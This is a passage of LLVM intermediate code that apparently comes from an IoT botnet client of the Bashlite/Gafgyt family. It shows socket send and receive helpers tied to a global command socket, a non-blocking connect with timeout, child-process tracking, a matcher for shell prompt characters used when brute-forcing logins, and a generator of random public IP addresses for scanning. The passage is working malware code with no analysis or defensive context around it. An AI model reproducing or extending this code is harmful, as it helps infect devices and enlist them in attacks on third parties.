  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #7
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #7

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #2 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #2 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #7
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #14
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.485, i64 0, i64 0), i8* %5)
  %12 = call i64 @strlen(i8* %5) #14
  %13 = call i64 @send(i32 %0, i8* %5, i64 %12, i32 16384) #7
  %14 = trunc i64 %13 to i32
  call void @free(i8* %5) #7
  ret i32 %14
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #8 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #14
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #14
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #2 {
  %3 = tail call i32 @inet_addr(i8* %0) #7
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #1 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #2 {
  %4 = alloca %struct.fd_set, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  %8 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 0
  store i64 30, i64* %8, align 8
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 1
  store i64 0, i64* %9, align 8
  %10 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #7, !srcloc !2
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.fd_set* nonnull %4, %struct.fd_set* null, %struct.fd_set* nonnull %4, %struct.timeval* nonnull %5) #7
  %22 = icmp sgt i32 %2, 1
  br i1 %22, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %31
  %.in = phi i32 [ %23, %31 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %32, %31 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %29, %31 ], [ %1, %.lr.ph.preheader ]
  %23 = add nsw i32 %.in, -1
  %24 = load i32, i32* @mainCommSock, align 4
  %25 = call i64 @recv(i32 %24, i8* nonnull %6, i64 1, i32 0) #7
  %26 = icmp eq i64 %25, 1
  br i1 %26, label %27, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %.lr.ph
  %28 = load i8, i8* %6, align 1
  %29 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %28, i8* %.01923, align 1
  %30 = icmp eq i8 %28, 10
  br i1 %30, label %._crit_edge.loopexit, label %31

; <label>:31:                                     ; preds = %27
  %32 = add nuw nsw i32 %.024, 1
  %33 = icmp sgt i32 %23, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %31, %27
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %29, %31 ], [ %29, %27 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %32, %31 ], [ %.024, %27 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #2 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #7
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #7
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #15
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #7
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #15
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #7, !srcloc !3
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.fd_set* null, %struct.fd_set* nonnull %6, %struct.fd_set* null, %struct.timeval* nonnull %7) #7
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #7
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #7
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #7
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #2 {
  %1 = tail call i32 @fork() #7
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %23, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #7
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %12 = load i32*, i32** @pids, align 8
  %13 = getelementptr inbounds i32, i32* %12, i64 %11
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %11
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = load i64, i64* @numpids, align 8
  %19 = add i64 %18, -1
  %20 = icmp ult i64 %17, %19
  br i1 %20, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.lcssa = phi i64 [ 0, %3 ], [ %19, %._crit_edge.loopexit ]
  %21 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %21, align 4
  %22 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  tail call void @free(i8* %22) #7
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %23

; <label>:23:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #8 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #14
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext29 = shl i64 %1, 32
  %5 = ashr exact i64 %sext29, 32
  %6 = getelementptr inbounds i8, i8* %0, i64 %5
  %sext41 = shl i64 %1, 32
  %7 = ashr exact i64 %sext41, 32
  %8 = icmp sgt i32 %2, 0
  br i1 %8, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %9 = icmp sgt i32 %2, %.1.lcssa
  br i1 %9, label %.lr.ph.preheader.1, label %.critedge.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %14, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %10 = sub nsw i64 0, %indvars.iv
  %11 = getelementptr inbounds i8, i8* %6, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = trunc i64 %indvars.iv to i32
  switch i8 %12, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %14 = add nsw i32 %.130, 1
  %15 = icmp sgt i64 %7, %indvars.iv.next
  br i1 %15, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %13, %.lr.ph ], [ %14, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %16 = sext i32 %.1.lcssa to i64
  %17 = sub nsw i64 0, %16
  %18 = getelementptr inbounds i8, i8* %4, i64 %17
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %19, 58
  br i1 %20, label %21, label %.preheader.137

; <label>:21:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.preheader.1:                               ; preds = %.preheader.137
  %22 = sext i32 %.1.lcssa to i64
  br label %.lr.ph.1

.lr.ph.1:                                         ; preds = %.critedge1.1, %.lr.ph.preheader.1
  %indvars.iv.1 = phi i64 [ %22, %.lr.ph.preheader.1 ], [ %indvars.iv.next.1, %.critedge1.1 ]
  %.130.1 = phi i32 [ %.1.lcssa, %.lr.ph.preheader.1 ], [ %27, %.critedge1.1 ]
  %23 = sub nsw i64 0, %indvars.iv.1
  %24 = getelementptr inbounds i8, i8* %6, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = trunc i64 %indvars.iv.1 to i32
  switch i8 %25, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %27 = add nsw i32 %.130.1, 1
  %28 = icmp sgt i64 %7, %indvars.iv.next.1
  br i1 %28, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %26, %.lr.ph.1 ], [ %27, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %29 = sext i32 %.1.lcssa.1 to i64
  %30 = sub nsw i64 0, %29
  %31 = getelementptr inbounds i8, i8* %4, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = icmp eq i8 %32, 62
  br i1 %33, label %21, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %34 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %34, label %.lr.ph.preheader.2, label %.critedge.2

.lr.ph.preheader.2:                               ; preds = %.preheader.238
  %35 = sext i32 %.1.lcssa.1 to i64
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.critedge1.2, %.lr.ph.preheader.2
  %indvars.iv.2 = phi i64 [ %35, %.lr.ph.preheader.2 ], [ %indvars.iv.next.2, %.critedge1.2 ]
  %.130.2 = phi i32 [ %.1.lcssa.1, %.lr.ph.preheader.2 ], [ %40, %.critedge1.2 ]
  %36 = sub nsw i64 0, %indvars.iv.2
  %37 = getelementptr inbounds i8, i8* %6, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = trunc i64 %indvars.iv.2 to i32
  switch i8 %38, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %40 = add nsw i32 %.130.2, 1
  %41 = icmp sgt i64 %7, %indvars.iv.next.2
  br i1 %41, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %39, %.lr.ph.2 ], [ %40, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %42 = sext i32 %.1.lcssa.2 to i64
  %43 = sub nsw i64 0, %42
  %44 = getelementptr inbounds i8, i8* %4, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = icmp eq i8 %45, 37
  br i1 %46, label %21, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %47 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %47, label %.lr.ph.preheader.3, label %.critedge.3

.lr.ph.preheader.3:                               ; preds = %.preheader.339
  %48 = sext i32 %.1.lcssa.2 to i64
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.critedge1.3, %.lr.ph.preheader.3
  %indvars.iv.3 = phi i64 [ %48, %.lr.ph.preheader.3 ], [ %indvars.iv.next.3, %.critedge1.3 ]
  %.130.3 = phi i32 [ %.1.lcssa.2, %.lr.ph.preheader.3 ], [ %53, %.critedge1.3 ]
  %49 = sub nsw i64 0, %indvars.iv.3
  %50 = getelementptr inbounds i8, i8* %6, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = trunc i64 %indvars.iv.3 to i32
  switch i8 %51, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %53 = add nsw i32 %.130.3, 1
  %54 = icmp sgt i64 %7, %indvars.iv.next.3
  br i1 %54, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %52, %.lr.ph.3 ], [ %53, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %55 = sext i32 %.1.lcssa.3 to i64
  %56 = sub nsw i64 0, %55
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = icmp eq i8 %58, 36
  br i1 %59, label %21, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %60 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %60, label %.lr.ph.preheader.4, label %.critedge.4

.lr.ph.preheader.4:                               ; preds = %.preheader.440
  %61 = sext i32 %.1.lcssa.3 to i64
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.critedge1.4, %.lr.ph.preheader.4
  %indvars.iv.4 = phi i64 [ %61, %.lr.ph.preheader.4 ], [ %indvars.iv.next.4, %.critedge1.4 ]
  %.130.4 = phi i32 [ %.1.lcssa.3, %.lr.ph.preheader.4 ], [ %66, %.critedge1.4 ]
  %62 = sub nsw i64 0, %indvars.iv.4
  %63 = getelementptr inbounds i8, i8* %6, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = trunc i64 %indvars.iv.4 to i32
  switch i8 %64, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %66 = add nsw i32 %.130.4, 1
  %67 = icmp sgt i64 %7, %indvars.iv.next.4
  br i1 %67, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %65, %.lr.ph.4 ], [ %66, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %68 = sext i32 %.1.lcssa.4 to i64
  %69 = sub nsw i64 0, %68
  %70 = getelementptr inbounds i8, i8* %4, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = icmp eq i8 %71, 35
  %. = zext i1 %72 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() local_unnamed_addr #2 {
  %1 = alloca [16 x i8], align 16
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %2 = tail call i32 @rand() #7
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* @getRandomPublicIP.ipState.0, align 1
  %5 = tail call i32 @rand() #7
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* @getRandomPublicIP.ipState.1, align 1
  %8 = tail call i32 @rand() #7
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* @getRandomPublicIP.ipState.2, align 1
  %11 = tail call i32 @rand() #7
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* @getRandomPublicIP.ipState.3, align 1
  %14 = load i8, i8* @getRandomPublicIP.ipState.0, align 1
  switch i8 %14, label %19 [
    i8 0, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 100, label %15
  ]

; <label>:15:                                     ; preds = %.critedge
  %16 = load i8, i8* @getRandomPublicIP.ipState.1, align 1
  %17 = icmp ugt i8 %16, 63
  %18 = icmp sgt i8 %16, -1
  %or.cond = and i1 %17, %18
  br i1 %or.cond, label %.critedge.backedge, label %thread-pre-split

thread-pre-split:                                 ; preds = %15
  %.pr = load i8, i8* @getRandomPublicIP.ipState.0, align 1
  br label %19

; <label>:19:                                     ; preds = %thread-pre-split, %.critedge
  %20 = phi i8 [ %.pr, %thread-pre-split ], [ %14, %.critedge ]
  switch i8 %20, label %24 [
    i8 127, label %.critedge.backedge
    i8 -87, label %21
  ]

; <label>:21:                                     ; preds = %19
  %22 = load i8, i8* @getRandomPublicIP.ipState.1, align 1
  %23 = icmp eq i8 %22, -2
  br i1 %23, label %.critedge.backedge, label %24

.critedge.backedge:                               ; preds = %21, %.critedge, %.critedge, %15, %19, %24, %29, %34, %41, %48, %38
  br label %.critedge

; <label>:24:                                     ; preds = %19, %21
  %25 = load i8, i8* @getRandomPublicIP.ipState.0, align 1
  %26 = icmp eq i8 %25, -84
  %27 = load i8, i8* @getRandomPublicIP.ipState.1, align 1
  %28 = icmp ult i8 %27, 17
  %or.cond18 = and i1 %26, %28
  br i1 %or.cond18, label %.critedge.backedge, label %29

; <label>:29:                                     ; preds = %24
  %30 = icmp eq i8 %25, -64
  %31 = icmp eq i8 %27, 0
  %or.cond20 = and i1 %30, %31
  %32 = load i8, i8* @getRandomPublicIP.ipState.2, align 1
  %33 = icmp eq i8 %32, 2
  %or.cond22 = and i1 %or.cond20, %33
  br i1 %or.cond22, label %.critedge.backedge, label %34

; <label>:34:                                     ; preds = %29
  %35 = icmp eq i8 %27, 88
  %or.cond24 = and i1 %30, %35
  %36 = icmp eq i8 %32, 99
